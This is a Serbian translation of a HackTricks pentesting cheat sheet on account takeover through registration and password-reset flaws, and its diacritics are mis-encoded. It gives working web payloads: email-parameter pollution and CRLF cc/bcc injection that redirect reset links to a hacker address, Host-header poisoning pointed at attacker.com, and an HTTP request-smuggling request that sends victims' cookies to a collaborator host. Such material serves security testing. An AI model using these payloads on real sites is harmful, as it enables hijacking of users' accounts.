# Registracione i preuzimanje ranjivosti

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**PorodiÄu PEASS**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraÅ¾ivaÄ pokretan **dark-web**-om koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **kompromitovani** od strane **malvera za kraÄ‘u podataka**.

Njihov primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomvera koji proizilaze iz malvera za kraÄ‘u informacija.

MoÅ¾ete posetiti njihovu veb lokaciju i isprobati njihovu maÅ¡inu za **besplatno** na:

{% embed url="https://whiteintel.io" %}

---

## Preuzimanje registracije

### Duplikat registracije

* PokuÅ¡ajte generisati koristeÄ‡i veÄ‡ postojeÄ‡e korisniÄko ime
* Proverite variranje e-poÅ¡te:
* velika slova
* \+1@
* dodajte taÄku u e-poÅ¡tu
* posebni karakteri u imenu e-poÅ¡te (%00, %09, %20)
* Stavite crne karaktere posle e-poÅ¡te: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### Enumeracija korisniÄkog imena

Proverite da li moÅ¾ete saznati kada je korisniÄko ime veÄ‡ registrovano unutar aplikacije.

### Politika lozinke

Prilikom kreiranja korisnika proverite politiku lozinke (proverite da li moÅ¾ete koristiti slabe lozinke).\
U tom sluÄaju moÅ¾ete pokuÅ¡ati sa brute force napadom na akreditive.

### SQL Injection

[**Proverite ovu stranicu** ](sql-injection/#insert-statement)da biste saznali kako pokuÅ¡ati preuzimanje naloga ili izvlaÄenje informacija putem **SQL Injection**-a u formama registracije.

### Oauth preuzimanje

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAML ranjivosti

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Promena e-poÅ¡te

Kada se registrujete, pokuÅ¡ajte da promenite e-poÅ¡tu i proverite da li je ova promena ispravno validirana ili moÅ¾ete promeniti na proizvoljne e-adrese.

### Dodatne provere

* Proverite da li moÅ¾ete koristiti **privremene e-adrese**
* **DugaÄka** **lozinka** (>200) dovodi do **DoS**-a
* **Proverite ograniÄenja brzine pri kreiranju naloga**
* Koristite username@**burp\_collab**.net i analizirajte **callback**

## **Preuzimanje resetovanja lozinke**

### Curenje tokena za resetovanje lozinke putem referera <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. ZatraÅ¾ite resetovanje lozinke na vaÅ¡u e-adresu
2. Kliknite na link za resetovanje lozinke
3. Ne menjajte lozinku
4. Kliknite na bilo koje web lokacije treÄ‡ih lica (npr. Facebook, Twitter)
5. Presretnite zahtev u Burp Suite proxy-u
6. Proverite da li referer zaglavlje otkriva token za resetovanje lozinke.

### Trovanje resetovanja lozinke <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Presretnite zahtev za resetovanje lozinke u Burp Suite-u
2. Dodajte ili izmenite sledeÄ‡e zaglavlja u Burp Suite-u: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Prosledite zahtev sa izmenjenim zaglavljem\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. PotraÅ¾ite URL za resetovanje lozinke na osnovu _host zaglavlja_ kao Å¡to je: `https://attacker.com/reset-password.php?token=TOKEN`

### Resetovanje lozinke putem parametra e-poÅ¡te <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR na API parametrima <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. NapadaÄ mora da se prijavi sa svojim nalogom i da ode na opciju **Promeni lozinku**.
2. Pokrenite Burp Suite i presretnite zahtev.
3. PoÅ¡aljite ga na karticu za ponavljanje i izmenite parametre: ID korisnika/e-poÅ¡ta\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Slab token za resetovanje lozinke <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Token za resetovanje lozinke treba da bude generisan nasumiÄno i jedinstven svaki put.\
PokuÅ¡ajte da utvrdite da li token istiÄe ili je uvek isti, u nekim sluÄajevima algoritam generisanja je slab i moÅ¾e biti pogodan. SledeÄ‡e promenljive mogu biti koriÅ¡Ä‡ene od strane algoritma.

* Vremenska oznaka
* ID korisnika
* E-poÅ¡ta korisnika
* Ime i prezime
* Datum roÄ‘enja
* Kriptografija
* Samo brojevi
* Mali niz tokena (karakteri izmeÄ‘u \[A-Z,a-z,0-9])
* Ponovna upotreba tokena
* Datum isteka tokena

### Otkrivanje tokena za resetovanje lozinke <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Pokrenite zahtev za resetovanje lozinke koristeÄ‡i API/UI za odreÄ‘enu e-poÅ¡tu, npr. test@mail.com
2. InspekcioniÅ¡ite odgovor servera i proverite `resetToken`
3. Zatim koristite token u URL-u poput `https://primer.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Resetovanje lozinke putem kolizije korisniÄkog imena <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrujte se na sistemu sa korisniÄkim imenom identiÄnim korisniÄkom imenu Å¾rtve, ali sa belinama ubaÄenim pre i/ili posle korisniÄkog imena, npr. `"admin "`
2. ZatraÅ¾ite resetovanje lozinke sa zlonamernim korisniÄkim imenom.
3. Koristite token poslat na vaÅ¡u e-poÅ¡tu i resetujte lozinku Å¾rtve.
4. PoveÅ¾ite se sa nalogom Å¾rtve sa novom lozinkom.

Platforma CTFd je bila ranjiva na ovaj napad.\
Vidi: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Preuzimanje naloga putem Cross Site Scripting-a <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. PronaÄ‘ite XSS unutar aplikacije ili poddomena ako su kolaÄiÄ‡i ograniÄeni na nadreÄ‘eni domen: `*.domain.com`
2. Procurejte trenutni **kolaÄiÄ‡ sesije**
3. Autentifikujte se kao korisnik koristeÄ‡i kolaÄiÄ‡

### Preuzimanje naloga putem HTTP zahteva Smuggling-a <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Koristite **smuggler** da otkrijete vrstu HTTP zahteva Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Kreirajte zahtev koji Ä‡e prebrisati `POST / HTTP/1.1` sa sledeÄ‡im podacima:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` sa ciljem preusmeravanja Å¾rtava na burpcollab i kraÄ‘e njihovih kolaÄiÄ‡a\
3\. KonaÄan zahtev bi mogao izgledati ovako
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
### IzveÅ¡taji Hackerone o iskoriÅ¡Ä‡avanju ovog baga\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Preuzimanje naloga putem CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Kreirajte payload za CSRF, npr. "HTML obrazac sa automatskim slanjem za promenu lozinke"
2. PoÅ¡aljite payload

### Preuzimanje naloga putem JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token moÅ¾e se koristiti za autentifikaciju korisnika.

* Izmenite JWT sa drugim ID-jem korisnika / Email-om
* Proverite da li postoji slabost u potpisu JWT-a

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Reference

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) je pretraÅ¾ivaÄ na **dark vebu** koji nudi **besplatne** funkcionalnosti za proveru da li je kompanija ili njeni korisnici **ugroÅ¾eni** od strane **malvera za kraÄ‘u podataka**.

Primarni cilj WhiteIntela je borba protiv preuzimanja naloga i napada ransomvera koji proizilaze iz malvera za kraÄ‘u informacija.

MoÅ¾ete posetiti njihovu veb lokaciju i isprobati njihovu maÅ¡inu za **besplatno** na:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
